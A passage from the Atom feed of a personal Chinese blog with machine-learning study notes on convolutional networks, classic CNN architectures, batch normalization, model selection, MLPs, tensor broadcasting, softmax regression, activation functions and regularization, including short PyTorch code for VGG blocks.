例如2x2最大池化将卷积输出增加左右各一个像素, 这样就允许了1个像素的移位, 缓解了卷积层对位置的敏感性</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240814150602.png"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;理论基础&quot;&gt;&lt;a href=&quot;#理论基础&quot; class=&quot;headerlink&quot; title=&quot;理论基础&quot;&gt;&lt;/a&gt;理论基础&lt;/h2&gt;&lt;h4 id=&quot;讨论前向传播和反向传播的流程？&quot;&gt;&lt;a href=&quot;#讨论前向传播和反向传播的流程？&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 现代卷积神经网络</title>
    <link href="https://myprefer.github.io/post/ML-%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</id>
    <published>2024-08-20T12:35:28.000Z</published>
    <updated>2024-08-20T14:54:45.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现代卷积神经网络"><a href="#现代卷积神经网络" class="headerlink" title="现代卷积神经网络"></a>现代卷积神经网络</h2><h3 id="LeNet"><a href="#LeNet" class="headerlink" title="LeNet"></a>LeNet</h3><p><img src="https://img-blog.csdnimg.cn/direct/3cc9b3544c3a4db1b652406be4481008.png"></p><h3 id="AlexNet"><a href="#AlexNet" class="headerlink" title="AlexNet"></a>AlexNet</h3><p>AlexNet和LeNet的设计理念和架构非常相似，但也存在显著差异。本质上来说，AlexNet是改进后的更深更大的LeNet</p><p>主要改进:</p><ul><li><p>全连接层的隐藏层后加入了丢弃层</p></li><li><p>sigmoid –&gt; ReLU (减缓梯度消失)</p></li><li><p>平均池化 –&gt; 最大池化</p></li><li><p>进行了数据增强</p></li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240819205903.png"></p><p>LeNet与AlexNet</p><h3 id="VGG-使用块的网络"><a href="#VGG-使用块的网络" class="headerlink" title="VGG(使用块的网络)"></a>VGG(使用块的网络)</h3><p>VGG块：可看作更大更深的AlexNet</p><p>VGG使用可重复的卷积块来构建深度卷积神经网络</p><p>VGG架构：</p><ul><li><p>替换掉AlexNet整个卷积的架构，形成n个VGG块串在一起, 多个VGG块后接全连接层</p></li><li><p>不同的卷积块个数和超参数可以达到不同复杂度的变种(VGG16, VGG19)</p></li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240819222413.png"></p><p><strong>vgg块的实现</strong></p><pre><code class="py">def vgg_block(num_convs, in_channels, out_channels):    layers = []    for _ in range(num_convs):        layers.append(nn.Conv2d(in_channels, out_channels,                                kernel_size=3, padding=1))        layers.append(nn.ReLU())        in_channels = out_channels    layers.append(nn.MaxPool2d(kernel_size=2,stride=2))    return nn.Sequential(*layers)</code></pre><p><strong>vgg网络的实现</strong></p><pre><code class="python">conv_arch = ((1, 64), (1, 128), (2, 256), (2, 512), (2, 512))def vgg(conv_arch):    conv_blks = []    in_channels = 1    # 卷积层部分    for (num_convs, out_channels) in conv_arch:        conv_blks.append(vgg_block(num_convs, in_channels, out_channels))        in_channels = out_channels    return nn.Sequential(        *conv_blks, nn.Flatten(),        # 全连接层部分        nn.Linear(out_channels * 7 * 7, 4096), nn.ReLU(), nn.Dropout(0.5),        nn.Linear(4096, 4096), nn.ReLU(), nn.Dropout(0.5),        nn.Linear(4096, 10))net = vgg(conv_arch)</code></pre><h3 id="NiN-网络中的网络"><a href="#NiN-网络中的网络" class="headerlink" title="NiN(网络中的网络)"></a>NiN(网络中的网络)</h3><p><strong>全连接层的问题</strong></p><ul><li>卷积层需要较少的参数</li><li>但卷积层后的第一个全连接层的参数非常多<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820183147.png"></li></ul><p><strong>NiN块</strong></p><ul><li>一个卷积层跟两个1x1卷积层(当作全连接层)</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820180602.png"></p><p><strong>NiN架构</strong></p><ul><li>无全连接层</li><li>交替使用NiN块和步幅为2的最大池化层, 逐步减小高宽和增大通道数</li><li>最后使用全局平均池化层得到输出<ul><li>其输入通道数是类别数</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820180825.png"></p><h3 id="GoogLeNet-含并行连结的网络"><a href="#GoogLeNet-含并行连结的网络" class="headerlink" title="GoogLeNet(含并行连结的网络)"></a>GoogLeNet(含并行连结的网络)</h3><p><strong>Inception块</strong></p><p>四个路径从不同层面抽取信息, 然后再输出通道维合并</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820201452.png"></p><ul><li><p>白色的卷积用来改变通道数，蓝色的卷积用来抽取信息。</p></li><li><p>最左边一条1X1卷积是用来抽取通道信息，其他的3X3卷积用来抽取空间信息。</p></li><li><p>通过降低通道数来控制模型复杂度, 每条路上的通道数可能不同</p></li><li><p>它的一个主要优点是模型参数小, 计算复杂度低</p></li></ul><p><strong>GoogLeNet结构</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820202053.png"></p><h3 id="ResNet-残差网络"><a href="#ResNet-残差网络" class="headerlink" title="ResNet (残差网络)"></a>ResNet (残差网络)</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820221137.png"></p><p>对于非嵌套函数类, 较复杂(图中较大区域)的函数类不能保证更加逼近真实, 而嵌套函数类能保证更加复杂的模型起码不会更差</p><p><strong>残差块</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820223510.png"></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820223530.png"></p><p>残差块使得很深的网络更加容易训练, 甚至可以训练一千层的网络</p><p><strong>ResNet块</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820223542.png"></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820223553.png"></p><hr><p><strong>ResNet如何解决梯度消失</strong></p><p>ResNet的操作相当于<br>$$<br>y’’ &#x3D; g(f(x))变为y’’&#x3D;f(x) + g(f(x))<br>$$<br>这样其导数<br>$$<br>\frac{∂y’’}{∂w}&#x3D;\frac{∂y}{∂w}+\frac{∂y’}{∂w}<br>$$<br>即使<code>y&#39;</code>的导数非常小, 加上y的导数后也不会太小</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;现代卷积神经网络&quot;&gt;&lt;a href=&quot;#现代卷积神经网络&quot; class=&quot;headerlink&quot; title=&quot;现代卷积神经网络&quot;&gt;&lt;/a&gt;现代卷积神经网络&lt;/h2&gt;&lt;h3 id=&quot;LeNet&quot;&gt;&lt;a href=&quot;#LeNet&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 卷积神经网络</title>
    <link href="https://myprefer.github.io/post/ML-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</id>
    <published>2024-08-13T15:50:25.000Z</published>
    <updated>2024-08-20T13:32:45.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h2><h3 id="卷积层"><a href="#卷积层" class="headerlink" title="卷积层"></a>卷积层</h3><p> 在卷积层中, 使用卷积核在输入图像上滑动, 并计算卷积核与局部图像块之间的点积, 生成特征图, 这一过程称为<strong>卷积</strong>。</p><p>如图, 3x3的卷积核在4x4的图像上滑动, 生成2x2的特征图</p><p><img src="https://raw.githubusercontent.com/vdumoulin/conv_arithmetic/master/gif/no_padding_no_strides.gif"></p><p>通过这种方式，卷积层能够捕捉图像中的边缘、纹理等局部特征。</p><ul><li>例如，一个简单的卷积核, 用于检测水平边缘:</li></ul><p>$$<br>K &#x3D; \begin{pmatrix} -1 &amp; -1 &amp; -1 \ 0 &amp; 0 &amp; 0 \ 1 &amp; 1 &amp; 1 \end{pmatrix}<br>$$</p><ul><li>图像上某一局部区域的像素值在卷积操作中，如果存在水平方向上的亮度变化（例如，从黑色像素到白色像素），卷积的结果就会是一个较大的值，表示该区域存在水平边缘</li></ul><p>卷积核和偏移(b)是可学习的参数</p><p>卷积核的大小是超参数</p><h4 id="填充和步幅"><a href="#填充和步幅" class="headerlink" title="填充和步幅"></a>填充和步幅</h4><p>(Padding, strides)<br><img src="https://raw.githubusercontent.com/vdumoulin/conv_arithmetic/master/gif/padding_strides.gif" alt="img"></p><ul><li>填充和步幅是卷积层的超参数</li><li>填充正在输入周围添加额外的行&#x2F;列, 来控制输出的减少量</li><li>步幅是每次滑动卷积核的步长, 可以成倍的减少输出的形状</li></ul><h4 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h4><p>神经网络中另外一个重要的超参数是<strong>通道数</strong></p><p><strong>多个输入通道</strong></p><ul><li><p>彩色图片一般有RGB三个通道<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141329213.png"></p></li><li><p>每个通道都有一个卷积核, 结果是所有通道卷积结果的和<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141330539.png"></p></li></ul><p><strong>多个输出通道</strong></p><ul><li><p>为什么要有多个输出通道？因为不管有多少个输入通道只会得到单输出通道的话是不够的</p></li><li><p>如果对每一个输出通道有一个三维的卷积核，这个卷积核会输出自己的通道（就相当于在三维的基础上又加了一维 i ，这一维表示输出的通道数）</p></li><li><p>可以有多个三维卷积核, 每个核生成一个输出通道</p></li><li><p>每个输出通道可以识别特定模式</p></li><li><p>输入通道核识别并组合输入中的模式</p></li></ul><h4 id="1x1卷积层"><a href="#1x1卷积层" class="headerlink" title="1x1卷积层"></a>1x1卷积层</h4><ul><li><p>卷积核的高和宽都等于1，意味着它不会识别空间信息，因为他每次只看一个空间像素所以不会去识别通道中的空间信息</p></li><li><p>1x1卷积不识别空间模式, 只是融合不同通道的信息</p></li><li><p>相当于输入形状为n_h*n_w*c, 权重为c_o*c_i的全连接层<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141427758.png"></p></li></ul><p><strong>作用</strong></p><ul><li><p>融合不同通道的信息, 可以认为是不做空间的匹配, 只是在输入层直接做输入通道和输出通道的融合, 等价于将整个输入拉成一个向量, 通道数等于特征的数量, 卷积核就相当于一个全连接层</p></li><li><p>1x1卷积可以在不改变输入特征图空间分辨率的情况下, 改变其通道数, 卷积层的输出的通道数由卷积核的个数决定, 通过设置1x1卷积核的数量, 可以做到升维&#x2F;降维</p></li></ul><h3 id="池化层"><a href="#池化层" class="headerlink" title="池化层"></a>池化层</h3><h4 id="二维最大池化"><a href="#二维最大池化" class="headerlink" title="二维最大池化"></a>二维最大池化</h4><ul><li>返回滑动窗口的<strong>最大值</strong><br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408141504312.png"></li></ul><p>例如2x2最大池化将卷积输出增加左右各一个像素, 这样就允许了1个像素的移位, 缓解了卷积层对位置的敏感性</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240814150602.png"></p><h4 id="平均池化层"><a href="#平均池化层" class="headerlink" title="平均池化层"></a>平均池化层</h4><ul><li>返回滑动窗口的<strong>平均值</strong></li></ul><hr><p><strong>总结</strong>:</p><ul><li>池化层返回窗口的最大或平均值</li><li>缓解卷积层对位置的敏感性</li><li>同样有窗口大小, 填充, 步幅作为超参数</li></ul><h3 id="批量归一化"><a href="#批量归一化" class="headerlink" title="批量归一化"></a>批量归一化</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/20240820203811.png"></p><p>损失出现在最顶端, 顶部的层训练比较快, 底部训练的很慢</p><p>底部层变化时, 所以层都得跟着变, 后面的层需要重新学习很多次, 导致训练变慢</p><p>因此提出:<strong>可以在学习底部层的时候避免变化顶部层吗?</strong></p><p>[<a href="https://www.bilibili.com/video/BV12d4y1f74C">5分钟深度学习] #06 批量归一化 Batch Normalization_哔哩哔哩_bilibili</a></p><p>批量归一化根据以下表达式转换</p><p>$$<br>\mathrm{BN}(\mathbf{x}) &#x3D; \boldsymbol{\gamma} \odot \frac{\mathbf{x} - \hat{\boldsymbol{\mu}}_\mathcal{B}}{\hat{\boldsymbol{\sigma}}_\mathcal{B}} + \boldsymbol{\beta}.<br>$$</p><p>  <strong>批量归一化层 BN层</strong></p><ul><li>作用在<ul><li>全连接层和卷积层的输出上, 激活函数前</li><li>全连接层和卷积层的输入上</li></ul></li><li>对于全连接层, 作用在特征维</li><li>对于卷积层, 作用在通道维</li></ul><p><strong>总结</strong></p><ul><li>批量归一化固定小批量中的均值和方差, 然后学习适合的偏移和缩放</li><li>批评了归一化可以加快收敛速度, 但一般不改变模型精度</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;卷积神经网络&quot;&gt;&lt;a href=&quot;#卷积神经网络&quot; class=&quot;headerlink&quot; title=&quot;卷积神经网络&quot;&gt;&lt;/a&gt;卷积神经网络&lt;/h2&gt;&lt;h3 id=&quot;卷积层&quot;&gt;&lt;a href=&quot;#卷积层&quot; class=&quot;headerlink&quot; title=&quot;卷积层</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 模型选择</title>
    <link href="https://myprefer.github.io/post/ML-%E6%A8%A1%E5%9E%8B%E9%80%89%E6%8B%A9.html"/>
    <id>https://myprefer.github.io/post/ML-%E6%A8%A1%E5%9E%8B%E9%80%89%E6%8B%A9.html</id>
    <published>2024-08-11T14:33:31.000Z</published>
    <updated>2024-08-12T02:39:20.761Z</updated>
    
    <content type="html"><![CDATA[<h3 id="训练误差和泛化误差"><a href="#训练误差和泛化误差" class="headerlink" title="训练误差和泛化误差"></a>训练误差和泛化误差</h3><ul><li>训练误差: 模型在训练数据上的误差</li><li>泛化误差: 模型在新数据上的误差</li></ul><h3 id="验证数据集和测试数据集"><a href="#验证数据集和测试数据集" class="headerlink" title="验证数据集和测试数据集"></a>验证数据集和测试数据集</h3><ul><li>验证数据集: 原来评估模型好坏<ul><li>验证数据集用于模型训练过程中进行验证和调参。通过在验证集上评估模型性能，可以监控模型是否过拟合，并且通过验证集来选择最优的超参数（如学习率、正则化强度等）</li><li>通常占数据集的10%-15%。验证集的数据不参与训练，主要用于在训练期间监控模型性能。</li></ul></li><li>测试数据集<ul><li>测试数据集用于在模型训练完毕后评估其泛化能力。这部分数据从未在模型训练或验证过程中使用过，因此可以较为客观地评估模型在真实世界中的表现。</li></ul></li></ul><h3 id="K折交叉验证"><a href="#K折交叉验证" class="headerlink" title="K折交叉验证"></a>K折交叉验证</h3><ul><li>在没有足够多数据时使用</li><li>算法:<ul><li>将心力衰竭分为k块</li><li>For i &#x3D; 1, …, k<ul><li>使用第i块作为验证数据集, 其余为训练数据集</li></ul></li><li>报告k个验证集误差的平均</li></ul></li></ul><h3 id="模型容量"><a href="#模型容量" class="headerlink" title="模型容量"></a>模型容量</h3><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408121026292.png"></p><ul><li>指拟合各种函数的能力 </li><li>低容量的模型难以拟合训练数据</li><li>高容量的模型可以记住所有的训练数据</li></ul><p><strong>模型容量的影响</strong></p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408121029668.png"></p><h3 id="数据复杂度"><a href="#数据复杂度" class="headerlink" title="数据复杂度"></a>数据复杂度</h3><ul><li><p>样本个数</p></li><li><p>每个样本的元素个数</p></li><li><p>时间, 空间结构</p></li><li><p>多样性</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;训练误差和泛化误差&quot;&gt;&lt;a href=&quot;#训练误差和泛化误差&quot; class=&quot;headerlink&quot; title=&quot;训练误差和泛化误差&quot;&gt;&lt;/a&gt;训练误差和泛化误差&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;训练误差: 模型在训练数据上的误差&lt;/li&gt;
&lt;li&gt;泛化误差: 模型在</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 多层感知机</title>
    <link href="https://myprefer.github.io/post/ML-%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA.html</id>
    <published>2024-08-11T08:53:57.000Z</published>
    <updated>2024-08-11T11:31:10.989Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多层感知机"><a href="#多层感知机" class="headerlink" title="多层感知机"></a>多层感知机</h2><p><em>最简单</em>的深度学习网络称为<em>多层感知机</em></p><h4 id="感知机-PLA"><a href="#感知机-PLA" class="headerlink" title="感知机(PLA)"></a>感知机(PLA)</h4><p>感知机只有输入层和输出层, 是单个神经元模型, 是一个线性二分类器, 但是不能对非线性的数据进行有效的分类, 感知机公式:</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408111710041.png"></p><p>感知机结构如下, 只有输入层, 输出层<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408111817373.png"></p><h4 id="多层感知机-MLP"><a href="#多层感知机-MLP" class="headerlink" title="多层感知机(MLP)"></a>多层感知机(MLP)</h4><p>多层感知机由感知机推广而来,  有多个层, 通常包括一个输入层, 一个或多个隐藏层, 一个输出层</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408111922514.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多层感知机&quot;&gt;&lt;a href=&quot;#多层感知机&quot; class=&quot;headerlink&quot; title=&quot;多层感知机&quot;&gt;&lt;/a&gt;多层感知机&lt;/h2&gt;&lt;p&gt;&lt;em&gt;最简单&lt;/em&gt;的深度学习网络称为&lt;em&gt;多层感知机&lt;/em&gt;&lt;/p&gt;
&lt;h4 id=&quot;感知机-PLA&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 数据操作</title>
    <link href="https://myprefer.github.io/post/ML-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C.html</id>
    <published>2024-08-10T03:09:24.000Z</published>
    <updated>2024-08-10T03:36:36.433Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>例:</p><ul><li><p>零维 一个数字</p></li><li><p>一维 多个数字</p></li><li><p>二维 矩阵(长*宽)</p></li><li><p>三维 RGB图片(通道*长*宽)</p></li><li><p>四维 图片批量(通道*长*宽*批量)</p></li><li><p>五维 视频(通道*长*宽*批量*时间)</p></li></ul><p>使用shape属性访问张量的形状和元素总数</p><pre><code>x = tensor([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])x.shape = torch.Size([12])</code></pre><p>reshape函数可以改变张量的形状</p><pre><code>X = x.reshape(3, 4)X = tensor([[ 0,  1,  2,  3],        [ 4,  5,  6,  7],        [ 8,  9, 10, 11]])</code></pre><h3 id="广播机制"><a href="#广播机制" class="headerlink" title="广播机制"></a>广播机制</h3><p>形状不同的数组可以调用广播机制执行按元素操作 </p><p>如</p><pre><code>a = tensor([[0],            [1],            [2]]) b = tensor([[0, 1]])</code></pre><p>如果执行<code>a + b</code></p><p>计算时, a, b会进行复制变换(实际没有改变)</p><pre><code>a = tensor([[0, 0],             [1, 1],             [2, 2]])b = tensor([[0, 1],            [0, 1],            [0, 1]])</code></pre><pre><code>a + b = tensor([[0, 1],                [1, 2],                [2, 3]])</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数据操作&quot;&gt;&lt;a href=&quot;#数据操作&quot; class=&quot;headerlink&quot; title=&quot;数据操作&quot;&gt;&lt;/a&gt;数据操作&lt;/h2&gt;&lt;h3 id=&quot;数组&quot;&gt;&lt;a href=&quot;#数组&quot; class=&quot;headerlink&quot; title=&quot;数组&quot;&gt;&lt;/a&gt;数组&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 多分类问题</title>
    <link href="https://myprefer.github.io/post/ML-%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98.html"/>
    <id>https://myprefer.github.io/post/ML-%E5%A4%9A%E5%88%86%E7%B1%BB%E9%97%AE%E9%A2%98.html</id>
    <published>2024-08-04T09:32:35.000Z</published>
    <updated>2024-08-11T06:51:29.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多分类问题"><a href="#多分类问题" class="headerlink" title="多分类问题"></a>多分类问题</h2><h3 id="从回归到分类"><a href="#从回归到分类" class="headerlink" title="从回归到分类"></a>从回归到分类</h3><h5 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h5><ul><li>单连续数值输出</li><li>跟真实值的区别作为损失</li></ul><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul><li>通常多个输出</li><li>输出i时预测为第i类的置信度(概率)</li></ul><h3 id="softmax-回归算法"><a href="#softmax-回归算法" class="headerlink" title="softmax 回归算法"></a>softmax 回归算法</h3><p>Softmax回归，又称多类别逻辑回归，是一种广泛用于多分类问题的算法。它是逻辑回归的扩展，能够处理具有多个类别的分类任务。</p><p>Softmax 回归算法的模型可以表示为：</p><p> <img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041739591.png"></p><p>在二分类问题中, 逻辑回归使用<em>sigmoid</em>函数将输入映射到一个概率值, 在多分类问题中, 我们使用softmax函数将输入映射到一组的概率值, 这些概率值的和为1</p><h4 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h4><p>Softmax回归使用交叉熵损失函数来衡量预测结果和真实标签之间的差距</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041831604.png"></p><p>一般的表示为</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041828347.png"></p><p>其中 x 是输入特征，y 是输出类别, yk表示真实标签的 one-hot 编码形式，K 是类别总数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多分类问题&quot;&gt;&lt;a href=&quot;#多分类问题&quot; class=&quot;headerlink&quot; title=&quot;多分类问题&quot;&gt;&lt;/a&gt;多分类问题&lt;/h2&gt;&lt;h3 id=&quot;从回归到分类&quot;&gt;&lt;a href=&quot;#从回归到分类&quot; class=&quot;headerlink&quot; title=&quot;从</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 神经网络</title>
    <link href="https://myprefer.github.io/post/ML-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html"/>
    <id>https://myprefer.github.io/post/ML-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html</id>
    <published>2024-08-03T08:43:22.000Z</published>
    <updated>2024-08-11T11:48:48.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p>用于识别复杂模式和数据中的特征。是机器学习和深度学习中的基础工具，特别适用于处理图像、语音和文本等非结构化数据。</p><h3 id="层（Layer）"><a href="#层（Layer）" class="headerlink" title="层（Layer）"></a>层（Layer）</h3><p>神经元按层组织，每一层的神经元与上一层的神经元相连。通常，神经网络包括输入层、隐藏层和输出层。</p><ul><li><p><strong>输入层</strong>：接收外部数据作为输入。</p></li><li><p><strong>隐藏层</strong>：通过多个隐藏层进行复杂的特征提取和模式识别。</p></li><li><p><strong>输出层</strong>：输出最终的预测结果或分类结果。</p></li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031747355.png"></p><p>每一层的输出成为下一层的输入 </p><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>在多层神经网络中, 上层节点的输出和下层节点的输入之间存在一个函数关系, 这个函数称为激活函数</p><h4 id="激活函数的作用"><a href="#激活函数的作用" class="headerlink" title="激活函数的作用"></a>激活函数的作用</h4><p>如果不使用激活函数(或者是只使用线性激活函数), 那么每一层节点的输入都是上层输出的线性变换, 这种情况下, 无论神经网络有多少层, 输出都只会是输入的线性组合, 网络的效果与没有隐藏层时的效果差不多, 网络的逼近能力就非常有限</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408041616976.png"></p><p>如果引入非线性函数作为激活函数, 那么网络的表达能力就会非常强大, 几乎可以逼近任何函数</p><h4 id="激活函数的选择"><a href="#激活函数的选择" class="headerlink" title="激活函数的选择"></a>激活函数的选择</h4><ul><li><p><strong>sigomoid</strong><br>$$<br>\sigma(x) &#x3D; \frac{1}{1 + e^{-x}}<br>$$<br><strong>适用场景</strong>：用于输出层处理<strong>二分类</strong>问题。</p></li><li><p><strong>ReLU</strong><br>$$<br>ReLU(x)&#x3D;max(0,x)<br>$$<br><strong>适用场景</strong>：</p><ul><li>广泛用于<strong>隐藏层</strong>，特别是在深度神经网络中。</li><li>用于<strong>回归问题</strong>的输出层</li></ul></li><li><p><strong>Softmax</strong><br>$$<br>\text{Softmax}(x_i) &#x3D; \frac{e^{x_i}}{\sum_{j} e^{x_j}}<br>$$<br><strong>适用场景</strong>：用于<strong>多分类</strong>问题的输出层。</p></li></ul><h3 id="前向传播"><a href="#前向传播" class="headerlink" title="前向传播"></a>前向传播</h3><p>神经网络前向传播从输入层到输出层：前向传播就是从输入层开始，经过一层层的Layer，不断计算每一层的神经网络得到的结果及通过激活函数的本层输出结果，最后得到输出的过程。</p><p><strong>输入层-&gt;隐藏层1</strong></p><p><strong>隐藏层1-&gt;隐藏层2</strong></p><p><strong>…</strong></p><p><strong>隐藏层n-&gt;输出层</strong></p><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><ul><li>前向传播计算出了输出值（也即预测值），就可以根据输出值与目标值的差别来计算loss</li><li>反向传播使根据损失函数计算损失函数相对于每个参数的梯度，来调整网络的参数</li></ul><h4 id="反向传播的步骤"><a href="#反向传播的步骤" class="headerlink" title="反向传播的步骤"></a>反向传播的步骤</h4><ul><li>计算输出层的误差</li><li>反向传播误差<ul><li>对于每个隐藏层，计算误差</li><li>从输出层开始，一层层反向计算，直到输入层</li></ul></li><li>梯度计算</li><li>参数更新</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;神经网络&quot;&gt;&lt;a href=&quot;#神经网络&quot; class=&quot;headerlink&quot; title=&quot;神经网络&quot;&gt;&lt;/a&gt;神经网络&lt;/h2&gt;&lt;p&gt;用于识别复杂模式和数据中的特征。是机器学习和深度学习中的基础工具，特别适用于处理图像、语音和文本等非结构化数据。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ML 正则化</title>
    <link href="https://myprefer.github.io/post/ML-%E6%AD%A3%E5%88%99%E5%8C%96.html"/>
    <id>https://myprefer.github.io/post/ML-%E6%AD%A3%E5%88%99%E5%8C%96.html</id>
    <published>2024-08-03T06:40:12.000Z</published>
    <updated>2024-08-13T12:58:48.962Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h2><p>在机器学习模型中，正则化通过在模型的损失函数中添加一个正则项来实现。这些惩罚项通常会限制模型的复杂度，使模型更加简单，从而更好地泛化到新数据。</p><p>在代价函数中加入正则项，通过lambda的来平衡拟合程度和参数的大小，约大越容易出现过拟合的现象。</p><p>引入正则项后的代价函数:</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031351589.png"></p><p><strong>λ</strong> 为正则化参数</p><ul><li>如果 λ 很大，正则化项的影响就很大，模型参数会被压得很小，导致模型变得简单（比如变成一条平滑的线）</li><li>如果 λ 很小，正则化项的影响就很小，模型参数可以自由调整，模型可能会变得复杂。</li></ul><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>如果有很多参数，我们<strong>不清楚哪个参数是高阶项</strong>，即<strong>不知道惩罚哪个能获得更好拟合的结果</strong>，因此<strong>引入正则化项统一惩罚参数</strong>(正则化参数)以得到较为简单的函数</p><p>统一惩罚能得到简单结果是因为，高阶项受到惩罚的效果会更强，反映在图像上就是使其影响变弱</p><ul><li>在线性回归中, 正则化使参数w每次都与一个小于1的数相乘, 使参数w在每次迭代中收缩一点</li></ul><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408031457844.png"></p><p>可以直观的理解为，我们<strong>最小化损失函数</strong>就是<strong>求蓝圈+红圈的和的最小值</strong>，而这个值通在很多情况下是两个曲面相交的地方。</p><h3 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h3><p>好的模型应该对输入数据的扰动更鲁棒, 使用丢弃法(dropout)在层之间加入噪音</p><p>丢弃法对每个元素进行如下扰动<br><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408132042456.png"></p><p>有p的概率置为0, 否则置为x&#x2F;(1-p)(保证期望仍为x), p为丢弃概率, 是控制模型复杂度的超参数</p><p>通常将丢弃法作用在隐藏全连接层的输出上</p><p><img src="https://raw.githubusercontent.com/Myprefer/ImageHost/main/202408132055420.png"></p>]]></content>
    
    
      
      
